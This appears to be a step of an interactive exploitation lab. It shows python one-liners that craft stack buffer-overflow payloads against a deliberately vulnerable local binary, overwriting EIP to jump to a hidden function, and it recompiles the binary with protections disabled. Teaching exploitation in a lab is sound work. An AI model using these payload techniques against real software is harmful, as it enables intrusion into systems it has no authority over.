# Leverage python for payload crafting 

## Install python

`apt install -y python python3 python-dev python3-dev python3-pip`{{execute}}

## python exploitation:

As a reminder:
- the secretHiddenFunction address is `\xce\x92\x04\x08` in python
- The payload is `./vuln AAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE` with EEEE to be replaced by the above address.

In python2 we can generate a payload with:

`python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xce\x92\x04\x08')"`{{execute}}

The 28 characters are called the offset and could be any character. The next 4 bytes are used to overwrite the EIP and must point to the function we want to execute.

Let's try the exploit:

`./vuln \`python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xce\x92\x04\x08')"\``{{execute}}

or 

`./vuln $(python -c "print('AAAAAAAAAAAAAAAABBBBCCCCDDDD'+'\xce\x92\x04\x08')")`{{execute}}

Et voila! we have successfully reached a piece of code which is never called, and we no longer have any segmentation fault. Which means that the signal handler is not a strong mitigation.

## What if the buffer size get too large?

Because our buffer size is only 16, it is quite easy to type by hand a larger sequence of character. But what if the buffer size is 2048, or 16384? even with copy-pasting it becomes tedious to crash the programme with a segmentation fault.

Let's modify the size of the buffer to 2048. We will use a command-line editor called vim (Feel free to use `nano` if you are not comfortable with `vim`). If you are stuck in vim, you can quit at any time by typing `<ESC>qa!`.

1. open the source file in vim: `vim ./vuln.c`{{execute}}
2. direct jump to the buffer size 16 by typing: `/16<ENTER>`
3. change the word (cw) under the cursor with the value 2048: `cw2048`
4. save and quit with: `<ESC>ZZ` or `<ESC>wq` (write then quit)

Recompile:

`gcc -m32 -O0 -fno-stack-protector -no-pie -z execstack  -o vuln vuln.c`{{execute}}

## generate a large payload 

`python -c "print('A'*2048 + 'B'*4 + 'C'*4 + 'D'*4 + 'E'*4 + 'F'*4)"`{{execute}}

`./vuln $(python -c "print('A'*2048 + 'B'*4 + 'C'*4 + 'D'*4 + 'E'*4 + 'F'*4)")`{{execute}}

`dmesg | tail -2`{{execute}}

`./vuln $(python -c "print('A'*2048 + 'B'*4 + 'C'*4 + 'D'*4 + '\xce\x92\x04\x08')")`{{execute}}

